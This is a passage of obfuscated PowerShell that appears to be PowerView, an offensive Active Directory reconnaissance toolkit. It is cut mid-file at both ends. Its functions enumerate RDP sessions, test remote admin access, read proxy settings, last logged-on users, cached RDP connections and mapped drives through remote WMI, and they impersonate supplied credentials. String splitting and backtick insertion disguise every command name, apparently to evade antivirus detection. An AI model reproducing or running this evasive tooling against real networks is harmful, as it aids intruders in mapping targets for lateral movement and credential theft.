                            ${Rdps`ESsi`ON}."Pso`BjECt"."tYp`En`AMeS".("{1}{2}{0}"-f'rt','I','nse').Invoke(0, ("{6}{4}{2}{3}{5}{7}{1}{0}" -f 'Info','sion','V','iew','wer','.R','Po','DPSes'))
                            ${RdPS`es`SI`on}

                            
                            ${N`ULL} = ${WTSA`Pi`32}::("{1}{0}{2}{3}"-f'Fr','WTS','eeMem','ory').Invoke(${p`p`BUfFEr})

                            ${o`FF`seT} += ${IN`Cre`m`ENT}
                        }
                    }
                    
                    ${n`ULl} = ${Wt`SaPi`32}::("{3}{4}{0}{1}{2}"-f 'FreeMe','moryE','x','WT','S').Invoke(2, ${PPSES`sIO`NInfO}, ${p`coU`Nt})
                }
                else {
                    &("{1}{2}{0}{3}"-f 'os','Writ','e-Verb','e') "[Get-NetRDPSession] Error: $(([ComponentModel.Win32Exception] $LastError).Message) "
                }
                
                ${N`Ull} = ${wT`s`Ap`I32}::("{2}{0}{1}{4}{3}"-f'T','S','W','r','CloseServe').Invoke(${han`D`LE})
            }
            else {
                &("{2}{1}{4}{3}{0}"-f 'erbose','it','Wr','-V','e') ('[G'+'e'+'t-NetRD'+'PSess'+'ion'+'] '+'Erro'+'r '+'open'+'i'+'ng '+'t'+'he '+'R'+'emote '+'Deskt'+'o'+'p '+'Ses'+'s'+'ion '+'H'+'ost '+'('+'RD '+'S'+'essio'+'n '+'H'+'ost)'+' '+'serve'+'r '+'f'+'or: '+"$ComputerName")
            }
        }
    }

    END {
        if (${LOgOnt`o`keN}) {
            &("{1}{3}{2}{0}" -f'oSelf','Invoke-R','vertT','e') -TokenHandle ${L`OgO`N`TOkeN}
        }
    }
}


function teSt-AD`mI`NACCe`ss {


    [OutputType({"{2}{3}{1}{4}{0}" -f 'ss','min','Pow','erView.Ad','Acce'})]
    [CmdletBinding()]
    Param(
        [Parameter(positIOn = 0, vaLUEfRoMpipeLIne = ${Tr`UE}, VALuEfRoMpiPElINebyPrOPeRtyNaME = ${tr`Ue})]
        [Alias({"{1}{0}{2}"-f 'ostNam','H','e'}, {"{0}{2}{1}" -f 'dnsho','tname','s'}, {"{0}{1}"-f 'nam','e'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${C`O`mPu`TeRnamE} = ("{0}{1}{3}{2}" -f 'lo','cal','t','hos'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cREden`T`i`Al} =   ( &("{3}{0}{1}{2}"-f 'VAR','IA','ble','geT-')  ("5"+"r0vK") -vALU  )::"e`MPty"
    )

    BEGIN {
        if (${p`SBO`UnDP`ArA`MeTERs}[("{1}{2}{0}"-f'tial','C','reden')]) {
            ${Lo`G`oNT`OKeN} = &("{2}{6}{3}{5}{0}{1}{7}{4}" -f'Imp','er','I','o','n','ke-User','nv','sonatio') -Credential ${CR`ed`EN`TIAl}
        }
    }

    PROCESS {
        ForEach (${coM`P`UteR} in ${cO`mPuT`Er`NAmE}) {
            
            
            ${h`An`dle} = ${ADV`A`PI32}::("{0}{3}{1}{2}"-f 'OpenSCM','age','rW','an').Invoke("\\$Computer", ("{1}{2}{3}{0}"-f'ive','Ser','vic','esAct'), 0xF003F);${L`AS`Te`RROR} =  (&("{1}{0}{2}{3}" -f '-vaR','geT','ia','BLe') ('F18'+'T')  -vaLUeOn)::("{0}{2}{1}{3}{4}{5}" -f 'G','tL','e','ast','W','in32Error').Invoke()

            ${ISAD`mIn} = &("{3}{2}{1}{0}"-f 'bject','w-O','e','N') ("{0}{1}{2}"-f'PSO','bje','ct')
            ${I`s`ADMiN} | &("{1}{0}{2}"-f'-Me','Add','mber') ("{0}{2}{1}"-f 'Noteprope','ty','r') ("{1}{2}{0}"-f'me','Comp','uterNa') ${cOMp`Ut`er}

            
            if (${Ha`NDle} -ne 0) {
                ${n`UlL} = ${ADV`Ap`I32}::("{0}{2}{3}{1}"-f'CloseS','ceHandle','erv','i').Invoke(${HANd`Le})
                ${ISA`dMiN} | &("{1}{0}{2}"-f 'd-Membe','Ad','r') ("{0}{2}{1}" -f 'N','property','ote') ("{0}{2}{1}"-f'I','min','sAd') ${T`RUe}
            }
            else {
                &("{2}{3}{0}{1}" -f 'Verb','ose','Wr','ite-') "[Test-AdminAccess] Error: $(([ComponentModel.Win32Exception] $LastError).Message) "
                ${is`ADmIn} | &("{0}{1}{2}"-f 'Ad','d','-Member') ("{0}{3}{1}{2}" -f'Notep','opert','y','r') ("{0}{1}" -f 'IsA','dmin') ${F`Al`se}
            }
            ${i`sAdMIn}."ps`O`BJeCt"."typE`Na`MES".("{0}{2}{1}"-f 'Ins','rt','e').Invoke(0, ("{1}{3}{2}{0}" -f 'ccess','PowerVi','.AdminA','ew'))
            ${i`SA`DMiN}
        }
    }

    END {
        if (${LO`gOnT`OKen}) {
            &("{2}{3}{1}{0}" -f 'f','oke-RevertToSel','I','nv') -TokenHandle ${L`OGo`N`Token}
        }
    }
}


function Ge`T-n`EtCO`MPUTEr`SiteNaME {


    [OutputType({"{2}{5}{0}{3}{1}{6}{4}"-f 'er','uterS','Po','View.Comp','te','w','i'})]
    [CmdletBinding()]
    Param(
        [Parameter(POSitIon = 0, VALUefRoMpipELiNE = ${TR`UE}, VALUefrOMPIpeLiNEbyPropeRtyName = ${tR`UE})]
        [Alias({"{0}{1}{2}"-f 'Hos','tN','ame'}, {"{0}{1}{2}" -f 'dns','hostna','me'}, {"{0}{1}"-f 'na','me'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${COMP`U`TErN`AME} = ("{0}{1}{2}" -f 'loc','alhos','t'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`RED`ent`IAl} =   ( &("{3}{2}{1}{0}" -f'IteM','HiLD','-c','GeT') ("{3}{2}{1}{0}"-f 'vK','0',':5r','VARiAble')  )."VA`LuE"::"Em`PTy"
    )

    BEGIN {
        if (${PSb`ou`N`DparamE`TerS}[("{2}{1}{0}"-f'ential','d','Cre')]) {
            ${l`OGO`Nt`okEn} = &("{3}{5}{1}{4}{2}{0}"-f'n','k','rsonatio','In','e-UserImpe','vo') -Credential ${cRe`d`E`NTIAL}
        }
    }

    PROCESS {
        ForEach (${c`O`mputER} in ${C`O`Mp`UTe`RNAmE}) {
            
            if (${comP`UteR} -match '^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$') {
                ${i`padDR`eSs} = ${ComP`UT`er}
                ${cO`mPut`eR} =  (  &("{2}{1}{3}{0}"-f'AblE','T','ge','-VARI')  ("{0}{1}"-f 'a','USKF1')  )."VaL`UE"::("{0}{3}{1}{2}" -f'GetHos','ByAd','dress','t').Invoke(${cOMp`Ut`ER}) | &("{0}{1}{2}{3}" -f'S','ele','ct-Ob','ject') -ExpandProperty ("{1}{0}{2}" -f 'ostNa','H','me')
            }
            else {
                ${Ip`Add`REsS} = @(&("{3}{5}{0}{4}{1}{2}"-f'PA','e','ss','Resolve-','ddr','I') -ComputerName ${Co`MP`UTEr})[0]."i`PA`ddREsS"
            }

            ${PT`RINFO} =  (  &("{1}{0}"-f 'r','dI') ("{3}{1}{2}{0}" -f '9','IAbl','e:Oy','vAR')  )."VA`luE"::"Z`erO"

            ${R`Es`UlT} = ${NE`TapI`32}::"d`SgEtSitEN`AME"(${cOmp`UT`er}, [ref]${P`TrIn`FO})

            ${coMPute`RSi`TE} = &("{1}{2}{3}{0}"-f 't','N','ew','-Objec') ("{0}{1}"-f'P','SObject')
            ${c`oMP`Uter`Site} | &("{1}{2}{0}"-f 'Member','A','dd-') ("{2}{0}{1}{3}"-f'tepr','ope','No','rty') ("{0}{2}{1}"-f 'C','puterName','om') ${cOmP`UTer}
            ${Co`MpU`TErSite} | &("{1}{0}{2}"-f 'e','Add-M','mber') ("{2}{1}{3}{0}" -f'y','ope','Notepr','rt') ("{2}{1}{0}" -f 'ess','ddr','IPA') ${IPAd`DR`eSS}

            if (${rES`U`lt} -eq 0) {
                ${S`ItEn`Ame} =   ( &("{0}{2}{1}" -f'VariAB','e','L') ('o5R'+'hlx') )."Va`lue"::("{0}{3}{1}{2}"-f 'Pt','T','oStringAuto','r').Invoke(${PTRi`NFo})
                ${c`OMPUT`E`RsITE} | &("{1}{2}{0}"-f'r','Add-Mem','be') ("{3}{2}{0}{1}"-f'e','rty','rop','Notep') ("{0}{1}" -f 'Si','teName') ${S`IteNA`mE}
            }
            else {
                &("{4}{2}{1}{0}{3}" -f'e-Ve','t','ri','rbose','W') "[Get-NetComputerSiteName] Error: $(([ComponentModel.Win32Exception] $Result).Message) "
                ${CO`m`p`UTer`siTE} | &("{1}{0}{2}" -f'dd-Mem','A','ber') ("{2}{0}{1}"-f'oteprop','erty','N') ("{2}{1}{0}" -f 'e','eNam','Sit') ''
            }
            ${co`MPu`Te`RsITE}."PSO`Bj`ECt"."tyPEn`A`mEs".("{1}{0}"-f'ert','Ins').Invoke(0, ("{4}{2}{0}{3}{1}" -f 'e','te','rVi','w.ComputerSi','Powe'))

            
            ${N`UlL} = ${NEta`PI`32}::("{4}{2}{3}{0}{1}" -f'f','ferFree','ApiB','u','Net').Invoke(${pT`RiNfo})

            ${c`OMP`UTERS`ite}
        }
    }

    END {
        if (${L`OG`OnTO`KeN}) {
            &("{2}{4}{1}{3}{0}" -f'ToSelf','oke-Rever','In','t','v') -TokenHandle ${LoGo`NToK`En}
        }
    }
}


function get-`W`MIrE`gPROxy {


    [OutputType({"{0}{5}{3}{1}{2}{4}" -f'P','ProxySetti','ng','rView.','s','owe'})]
    [CmdletBinding()]
    Param(
        [Parameter(POsITION = 0, VALueFRoMpiPeLiNE = ${t`RUE}, VALUefROMpipeLinebYPROPERTynAmE = ${t`Rue})]
        [Alias({"{1}{0}" -f'e','HostNam'}, {"{0}{2}{1}" -f 'dnshostn','e','am'}, {"{1}{0}"-f'me','na'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${com`p`UTerNa`ME} = ${eNv:`cOM`PU`TErn`AME},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`R`EdEn`TiaL} =  ${5`R0`VK}::"Em`PTY"
    )

    PROCESS {
        ForEach (${C`o`MPUTeR} in ${coMPU`Ter`Name}) {
            try {
                ${wM`iarGUM`EnTs} = @{
                    ("{1}{0}"-f 't','Lis') = ${T`RuE}
                    ("{1}{0}" -f'ss','Cla') = ("{1}{0}{2}"-f 'e','StdR','gProv')
                    ("{2}{1}{0}" -f 'e','espac','Nam') = ((("{2}{1}{0}" -f'ult','defa','rootEfS'))-rEPlAcE  ([CHAr]69+[CHAr]102+[CHAr]83),[CHAr]92)
                    ("{3}{0}{1}{2}"-f 'omput','erna','me','C') = ${COmpU`T`ER}
                    ("{0}{2}{1}"-f'Er','ion','rorAct') = ("{1}{0}"-f'p','Sto')
                }
                if (${pS`BOu`NDPaRAm`EtE`RS}[("{0}{1}{2}{3}" -f'Cre','dent','i','al')]) { ${WMIa`RGu`mEn`Ts}[("{3}{1}{2}{0}" -f'ential','e','d','Cr')] = ${cr`eD`ENTI`AL} }

                ${R`EgPr`OV`IdER} = &("{2}{3}{0}{1}"-f 'e','ct','Get-W','miObj') @WmiArguments
                ${k`ey} = ((("{2}{10}{12}{3}{6}{16}{15}{1}{5}{13}{8}{7}{0}{11}{9}{4}{17}{14}" -f'Version','indow','SOFTWA','cr','nt','s{0}C','oso','t','rren','}I','RE','{0','{0}Mi','u','ngs','{0}W','ft','ernet Setti'))-f[ChaR]92)

                
                ${H`KCU} = 2147483649
                ${P`ROx`Ys`erveR} = ${rEGpR`Ov`i`dER}.("{0}{1}{2}{3}" -f 'GetStri','ngVa','lu','e').Invoke(${h`KCU}, ${k`eY}, ("{1}{0}{3}{2}"-f'er','ProxyS','r','ve'))."sVa`LuE"
                ${Au`ToCOnF`ig`UrL} = ${re`Gprovi`dEr}.("{3}{4}{2}{1}{0}" -f'ue','ngVal','tStri','G','e').Invoke(${h`kcU}, ${K`ey}, ("{3}{2}{0}{1}"-f'toConfi','gURL','u','A'))."SVAl`UE"

                ${wP`Ad} = ''
                if (${A`Ut`OCO`NF`iGURL} -and (${au`T`Ocon`Fi`GURL} -ne '')) {
                    try {
                        ${wP`Ad} = (&("{0}{2}{1}"-f 'New-Obj','t','ec') ("{3}{2}{4}{1}{0}" -f 't','ien','WebC','Net.','l')).("{3}{0}{1}{2}"-f'wnload','St','ring','Do').Invoke(${Aut`oC`o`NFI`GuRL})
                    }
                    catch {
                        &("{0}{3}{1}{2}"-f 'W','ite','-Warning','r') ('['+'G'+'et-W'+'MIRegPro'+'xy] '+'Error'+' '+'co'+'nnect'+'in'+'g '+'t'+'o '+'AutoC'+'onfi'+'g'+'URL'+' '+': '+"$AutoConfigURL")
                    }
                }

                if (${p`ROx`YSERv`ER} -or ${AuTOco`NFiG`Url}) {
                    ${O`Ut} = &("{3}{2}{0}{1}"-f'je','ct','-Ob','New') ("{2}{0}{1}" -f'ec','t','PSObj')
                    ${O`UT} | &("{2}{0}{1}" -f 'embe','r','Add-M') ("{0}{2}{3}{1}"-f'Note','perty','p','ro') ("{2}{3}{0}{1}"-f'm','e','Comp','uterNa') ${coM`PuTeR}
                    ${O`UT} | &("{1}{0}{2}"-f'Membe','Add-','r') ("{2}{3}{0}{1}" -f 'prope','rty','No','te') ("{1}{3}{0}{2}" -f 'e','Pro','rver','xyS') ${PrOx`y`SE`RveR}
                    ${O`Ut} | &("{1}{0}{2}" -f 'm','Add-Me','ber') ("{1}{2}{0}{3}" -f 'o','Note','pr','perty') ("{2}{0}{1}" -f 'Confi','gURL','Auto') ${AUToCON`F`IGUrL}
                    ${O`UT} | &("{2}{1}{0}"-f'-Member','d','Ad') ("{2}{0}{1}{3}" -f'r','op','Notep','erty') ("{0}{1}" -f 'Wp','ad') ${wp`AD}
                    ${O`UT}."pS`obJE`ct"."TyPen`A`MeS".("{0}{2}{1}" -f 'In','rt','se').Invoke(0, ("{1}{5}{2}{0}{3}{4}{6}" -f 'oxyS','PowerVi','Pr','ett','ing','ew.','s'))
                    ${o`UT}
                }
                else {
                    &("{0}{2}{1}{3}"-f 'Write-Wa','n','r','ing') ('[Ge'+'t-W'+'M'+'IReg'+'Proxy]'+' '+'No'+' '+'prox'+'y'+' '+'se'+'t'+'tings '+'found'+' '+'fo'+'r '+"$ComputerName")
                }
            }
            catch {
                &("{0}{2}{1}"-f 'Wr','ning','ite-War') ('[Get-WMIR'+'e'+'gPr'+'oxy] '+'Er'+'ror '+'e'+'nu'+'merating '+'p'+'rox'+'y '+'set'+'ting'+'s '+'fo'+'r '+"$ComputerName "+': '+"$_")
            }
        }
    }
}


function Get-wmir`egLas`TlOGG`EDOn {


    [OutputType({"{5}{0}{4}{6}{3}{2}{1}" -f 'rV','er','s','dOnU','iew.LastLo','Powe','gge'})]
    [CmdletBinding()]
    Param(
        [Parameter(pOsiTiOn = 0, vaLuEfrOMpiPelinE = ${TR`Ue}, valueFROMPIpeliNeByprOPerTyNAME = ${t`Rue})]
        [Alias({"{0}{1}"-f 'HostN','ame'}, {"{2}{0}{1}{3}" -f'hostn','am','dns','e'}, {"{1}{0}" -f'e','nam'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${c`omPUTE`RNAMe} = ("{1}{2}{0}" -f 'ost','local','h'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${crED`eN`TiAl} =  ${5`R0vk}::"E`mpTy"
    )

    PROCESS {
        ForEach (${cOMpU`T`eR} in ${C`OmPuTeR`NAmE}) {
            
            ${HK`lm} = 2147483650

            ${Wm`IargUM`ENTs} = @{
                ("{1}{0}"-f 'ist','L') = ${T`RUe}
                ("{0}{1}"-f 'Cla','ss') = ("{1}{2}{0}"-f 'gProv','Std','Re')
                ("{1}{0}{2}"-f'amespa','N','ce') = ((("{2}{0}{1}"-f'ot{0','}default','ro')) -F  [ChAR]92)
                ("{3}{0}{2}{1}" -f'p','me','uterna','Com') = ${C`OMput`eR}
                ("{0}{2}{1}{3}"-f 'Er','Act','ror','ion') = ("{0}{2}{1}{3}"-f'Silentl','Con','y','tinue')
            }
            if (${PSbo`Un`DPaRAM`ETeRS}[("{1}{2}{0}" -f 'al','Cred','enti')]) { ${w`m`IA`RgumenTs}[("{1}{2}{0}" -f 'l','Credent','ia')] = ${C`Red`ent`IAl} }

            
            try {
                ${r`eG} = &("{2}{0}{1}" -f 'Obje','ct','Get-Wmi') @WmiArguments

                ${k`EY} = ((("{10}{2}{0}{12}{18}{16}{4}{1}{3}{17}{14}{15}{9}{8}{19}{5}{11}{7}{13}{6}" -f'FTWARE','sK5vCur','O','re','ow','at','nUI','o','Authen','v','S','i','K5vMicrosoftK5','nK5vLogo','rs','ionK5','Wind','ntVe','v','tic'))-rEPlacE'K5v',[ChaR]92)
                ${V`ALue} = ("{3}{4}{2}{0}{1}" -f 'gged','OnUser','Lo','La','st')
                ${lA`s`TUsEr} = ${r`eg}.("{3}{0}{1}{2}"-f 'StringVal','u','e','Get').Invoke(${h`kLM}, ${K`EY}, ${v`A`LUE})."sVA`luE"

                ${LA`st`loGGE`d`ON} = &("{0}{2}{1}" -f 'New-','ect','Obj') ("{1}{0}"-f 'ct','PSObje')
                ${la`STlOG`gedON} | &("{2}{1}{0}"-f 'ember','M','Add-') ("{0}{2}{1}" -f'Not','y','epropert') ("{2}{0}{1}"-f 'puterNa','me','Com') ${C`Om`PUter}
                ${laSTLoGge`D`On} | &("{1}{2}{0}"-f'er','Ad','d-Memb') ("{2}{1}{0}"-f'ty','oteproper','N') ("{1}{2}{0}" -f'gedOn','LastLo','g') ${l`AsTU`SeR}
                ${lASTlog`g`e`dOn}."p`sO`BJEcT"."tYP`EnAM`es".("{1}{0}"-f 'sert','In').Invoke(0, ("{1}{4}{2}{3}{0}"-f 'er','P','erView.Las','tLoggedOnUs','ow'))
                ${LAsT`LOG`GeD`On}
            }
            catch {
                &("{1}{2}{0}" -f '-Warning','W','rite') ('['+'Get-W'+'MIR'+'egLastL'+'ogge'+'dOn'+'] '+'Error'+' '+'op'+'ening '+'rem'+'ote '+'r'+'egistry '+'o'+'n '+"$Computer. "+'Remot'+'e '+'reg'+'istry '+'li'+'kely'+' '+'no'+'t '+'ena'+'bl'+'ed.')
            }
        }
    }
}


function GEt-wM`IRegCacH`e`DRDpCO`NN`EcTIon {


    [OutputType({"{3}{6}{1}{4}{0}{5}{2}" -f'Vie','we','DPConnection','P','r','w.CachedR','o'})]
    [CmdletBinding()]
    Param(
        [Parameter(pOsItion = 0, ValUEFroMpIPelIne = ${TR`UE}, valuEfrompIpelInEbYPrOpErtYnAMe = ${tr`UE})]
        [Alias({"{1}{2}{0}" -f'e','HostNa','m'}, {"{0}{2}{1}" -f'dnsho','me','stna'}, {"{1}{0}" -f'me','na'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${COmp`U`Tern`AME} = ("{2}{0}{1}" -f'ca','lhost','lo'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cR`Eden`TiaL} =   ( &("{1}{2}{0}"-f'Em','CHiL','dit') ("{4}{0}{1}{3}{2}"-f'R','iAB','e:5R0vk','l','VA') )."VaL`Ue"::"Em`PtY"
    )

    PROCESS {
        ForEach (${COmP`UtEr} in ${CoMpUt`eRNa`me}) {
            
            ${H`KU} = 2147483651

            ${w`mIA`RGU`MENTS} = @{
                ("{0}{1}"-f'Li','st') = ${tr`UE}
                ("{0}{1}"-f'C','lass') = ("{0}{1}{2}"-f'StdRe','g','Prov')
                ("{1}{2}{0}"-f 'e','Name','spac') = ((("{0}{2}{3}{1}" -f 'ro','lt','ot0O7','defau'))."repL`A`ce"(([CHAR]48+[CHAR]79+[CHAR]55),[STrINg][CHAR]92))
                ("{1}{2}{0}{3}"-f'na','Compute','r','me') = ${coM`pU`TeR}
                ("{1}{2}{0}" -f'Action','Er','ror') = ("{0}{1}" -f 'Sto','p')
            }
            if (${PsBO`U`NDpA`RAME`TE`RS}[("{2}{1}{3}{0}" -f 'ial','e','Cr','dent')]) { ${wmi`ARGuM`entS}[("{1}{3}{0}{2}"-f'n','Cre','tial','de')] = ${creD`eNti`AL} }

            try {
                ${R`Eg} = &("{2}{1}{0}" -f'miObject','t-W','Ge') @WmiArguments

                
                ${USe`RSI`ds} = (${R`eg}.("{1}{0}{2}" -f 'e','EnumK','y').Invoke(${H`ku}, ''))."S`NA`mes" | &("{0}{1}{2}"-f 'W','he','re-Object') { ${_} -match (('S'+'-1'+'-5'+'-21-['+'0-9]+'+'-[0'+'-9'+']+-[0-9]+-'+'[0'+'-9]'+'+{0}')  -F[CHaR]36) }

                ForEach (${U`sE`RsiD} in ${Use`RSIDs}) {
                    try {
                        if (${psBou`N`dparAMet`e`Rs}[("{0}{1}{2}{3}" -f'Cred','e','nti','al')]) {
                            ${Us`e`RnAme} = &("{3}{2}{0}{1}" -f 'tFro','m-SID','onver','C') -ObjectSid ${Use`R`SiD} -Credential ${CRe`D`ENTIAL}
                        }
                        else {
                            ${Usern`A`me} = &("{0}{1}{3}{2}" -f 'C','onvert','om-SID','Fr') -ObjectSid ${us`erSid}
                        }

                        
                        ${C`ONN`Ec`T`ioNkEYs} = ${R`EG}.("{1}{2}{0}"-f 'alues','E','numV').Invoke(${h`KU},("$UserSID\Software\Microsoft\Terminal "+'Ser'+'ver'+' '+(('Cl'+'ientmP'+'d'+'Defa'+'ult') -rePLAcE([chaR]109+[chaR]80+[chaR]100),[chaR]92)))."S`Names"

                        ForEach (${cONN`Ect`i`On} in ${COn`NEcTiOnk`EyS}) {
                            
                            if (${CoN`NeC`TiOn} -match ("{0}{1}"-f 'MR','U.*')) {
                                ${t`A`RGeTServ`ER} = ${r`eg}.("{3}{0}{2}{1}" -f'tr','lue','ingVa','GetS').Invoke(${H`kU}, ("$UserSID\Software\Microsoft\Terminal "+'Serv'+'e'+'r '+('Cli'+'entn'+'Z1Defa'+'ult')."r`E`plaCe"(([chaR]110+[chaR]90+[chaR]49),'\')), ${Co`NNECt`i`On})."SV`AluE"

                                ${fOuN`DcO`NnE`c`Tion} = &("{0}{2}{1}"-f 'New-','t','Objec') ("{1}{2}{0}"-f'ject','PS','Ob')
                                ${fou`N`dcO`Nn`ECtION} | &("{2}{1}{0}" -f 'mber','dd-Me','A') ("{0}{2}{1}"-f 'N','perty','otepro') ("{2}{0}{1}" -f 'ompute','rName','C') ${COMpU`T`eR}
                                ${F`oUnd`CO`N`NecT`ioN} | &("{1}{2}{0}"-f'er','Add-Mem','b') ("{2}{0}{3}{1}"-f't','roperty','No','ep') ("{0}{2}{1}" -f 'User','e','Nam') ${uS`ern`AmE}
                                ${f`OuNdCON`NEC`TIon} | &("{2}{1}{0}"-f 'r','dd-Membe','A') ("{2}{1}{3}{0}"-f'rty','p','Notepro','e') ("{0}{2}{1}"-f'Us','rSID','e') ${USE`RSiD}
                                ${Fou`NDCO`N`NEct`IoN} | &("{1}{2}{0}"-f'mber','Add-M','e') ("{1}{2}{0}"-f'ty','Notepr','oper') ("{0}{3}{2}{1}" -f'Targe','er','rv','tSe') ${T`Arge`TseRVeR}
                                ${FoUndC`o`NneC`TIoN} | &("{0}{2}{1}" -f'A','-Member','dd') ("{0}{3}{1}{2}" -f'N','prop','erty','ote') ("{3}{0}{1}{2}" -f 's','ern','ameHint','U') ${N`Ull}
                                ${f`o`Un`dconnectION}."Ps`Ob`JECT"."t`yP`enAMEs".("{1}{0}"-f'nsert','I').Invoke(0, ("{1}{8}{3}{0}{6}{5}{2}{4}{7}"-f 'ew.C','Power','Co','i','n','hedRDP','ac','nection','V'))
                                ${fouN`DConN`e`CTION}
                            }
                        }

                        
                        ${sE`R`VeRKeYS} = ${r`Eg}.("{1}{2}{0}" -f'ey','E','numK').Invoke(${H`kU},("$UserSID\Software\Microsoft\Terminal "+'S'+'erver '+('Cli'+'en'+'tbqxS'+'er'+'ver'+'s')."R`EPl`ACe"('bqx',[STRinG][char]92)))."sn`AmEs"

                        ForEach (${sE`R`Ver} in ${SER`VeR`Ke`YS}) {

                            ${usERn`Am`EH`i`Nt} = ${R`Eg}.("{3}{2}{1}{0}" -f 'ue','al','gV','GetStrin').Invoke(${H`ku}, ("$UserSID\Software\Microsoft\Terminal "+'S'+'er'+'ver '+"Client\Servers\$Server"), ("{3}{1}{0}{2}" -f 'ameH','ern','int','Us'))."sv`A`lue"

                            ${FoU`N`DCon`NEc`TIOn} = &("{1}{2}{0}"-f'Object','New','-') ("{2}{0}{1}"-f 'SOb','ject','P')
                            ${fo`UN`DCo`NNEctIOn} | &("{2}{0}{3}{1}" -f'Mem','r','Add-','be') ("{3}{0}{2}{1}" -f 'ote','y','propert','N') ("{0}{2}{1}"-f'Co','ame','mputerN') ${cOM`pu`TEr}
                            ${FoUndco`N`NeC`T`Ion} | &("{1}{0}{2}"-f'mbe','Add-Me','r') ("{1}{3}{2}{0}" -f 'ty','Not','roper','ep') ("{1}{0}{2}"-f 'se','U','rName') ${UsEr`N`AMe}
                            ${fOU`NDCoN`NeC`Tion} | &("{1}{2}{0}"-f'r','Add-Mem','be') ("{1}{2}{0}{3}"-f'prop','No','te','erty') ("{2}{0}{1}"-f'SI','D','User') ${U`SeR`siD}
                            ${FOU`NDc`On`NeCtiOn} | &("{2}{3}{1}{0}"-f 'ember','M','A','dd-') ("{0}{1}{2}"-f'N','oteproper','ty') ("{0}{1}{3}{2}"-f'Tar','g','Server','et') ${s`ERvER}
                            ${FoUNdC`oNne`c`TioN} | &("{0}{2}{3}{1}"-f 'A','mber','dd-M','e') ("{2}{0}{1}{3}" -f'te','p','No','roperty') ("{2}{0}{1}"-f 'in','t','UsernameH') ${Us`Ern`AMe`Hint}
                            ${F`OUn`dcoNNeC`TIon}."pS`oBj`eCT"."TYPe`NaM`Es".("{1}{0}"-f 'ert','Ins').Invoke(0, ("{4}{7}{3}{1}{5}{6}{8}{2}{0}"-f 'n','d','tio','rView.Cache','Po','R','DPConne','we','c'))
                            ${founDcoNne`CT`I`On}
                        }
                    }
                    catch {
                        &("{2}{0}{3}{1}{4}" -f'te','bos','Wri','-Ver','e') ('[Get-WMIR'+'egCache'+'dRDPCon'+'n'+'ect'+'i'+'on] '+'Er'+'ror: '+"$_")
                    }
                }
            }
            catch {
                &("{1}{2}{0}" -f'ng','Write-Wa','rni') ('[Get-'+'WM'+'IRegCa'+'chedRD'+'PConn'+'ec'+'t'+'ion] '+'Er'+'ro'+'r '+'acc'+'essin'+'g '+"$Computer, "+'likely'+' '+'insu'+'ffic'+'ient '+'p'+'ermissio'+'ns '+'o'+'r '+'f'+'irewall '+'ru'+'les '+'o'+'n '+'h'+'os'+'t: '+"$_")
            }
        }
    }
}


function g`e`T-wM`i`RegmountEDdrIvE {


    [OutputType({"{2}{5}{0}{1}{4}{3}" -f'.Re','g','PowerVi','ountedDrive','M','ew'})]
    [CmdletBinding()]
    Param(
        [Parameter(posiTiOn = 0, VAluEfromPIpeLinE = ${TR`Ue}, VAlUefrOMpIpeLInebypRopeRtyNaME = ${T`RuE})]
        [Alias({"{1}{0}{2}" -f'm','HostNa','e'}, {"{1}{2}{0}"-f 'tname','dn','shos'}, {"{1}{0}" -f'ame','n'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${co`MpUTeRn`AMe} = ("{0}{2}{1}"-f 'l','calhost','o'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cRedE`NTI`Al} =  ${5R0`VK}::"eM`pty"
    )

    PROCESS {
        ForEach (${COM`pu`TER} in ${cOm`P`UtER`NAMe}) {
            
            ${H`ku} = 2147483651

            ${wmiA`R`g`UMENTs} = @{
                ("{1}{0}" -f'st','Li') = ${TR`Ue}
                ("{0}{1}"-f 'Clas','s') = ("{2}{1}{0}"-f 'RegProv','d','St')
                ("{0}{1}" -f 'Na','mespace') = ((("{0}{2}{3}{4}{1}"-f 'ro','lt','ot{0}de','f','au'))-F [ChAR]92)
                ("{1}{0}{2}"-f'puternam','Com','e') = ${CO`mPuT`Er}
                ("{0}{3}{1}{2}"-f'E','t','ion','rrorAc') = ("{0}{1}"-f'S','top')
            }
            if (${pSBoUNd`p`ArAm`etErs}[("{0}{1}{2}" -f 'Credenti','a','l')]) { ${wm`IAR`G`UMEn`TS}[("{1}{2}{0}" -f 'al','Cre','denti')] = ${CREdeNT`i`AL} }

            try {
                ${r`Eg} = &("{1}{0}{2}" -f '-Wm','Get','iObject') @WmiArguments

                
                ${User`S`iDS} = (${r`Eg}.("{0}{1}" -f'En','umKey').Invoke(${H`kU}, ''))."s`NaM`ES" | &("{0}{3}{2}{1}"-f'Whe','ct','-Obje','re') { ${_} -match (('S-'+'1-5-21-[0-'+'9]+-'+'[0-9]'+'+'+'-'+'[0'+'-9]+-[0-'+'9'+']'+'+'+'zoE').("{0}{1}{2}"-f'RE','PlAc','E').Invoke('zoE','$')) }

                ForEach (${us`e`RsID} in ${Use`RsI`dS}) {
                    try {
                        if (${pS`BO`UNdpaR`AmetE`Rs}[("{1}{0}{2}"-f'ti','Creden','al')]) {
                            ${uS`E`RNAmE} = &("{0}{3}{2}{1}" -f'Co','tFrom-SID','ver','n') -ObjectSid ${U`s`eRSiD} -Credential ${c`REDeN`TiAl}
                        }
                        else {
                            ${us`er`N`AMe} = &("{0}{1}{3}{2}" -f 'C','onv','tFrom-SID','er') -ObjectSid ${USE`RSid}
                        }

                        ${d`Rive`l`eTTerS} = (${R`Eg}.("{0}{1}" -f 'Enum','Key').Invoke(${h`kU}, "$UserSID\Network"))."sNa`m`eS"

                        ForEach (${driv`ElET`TEr} in ${D`RIve`Let`TERS}) {
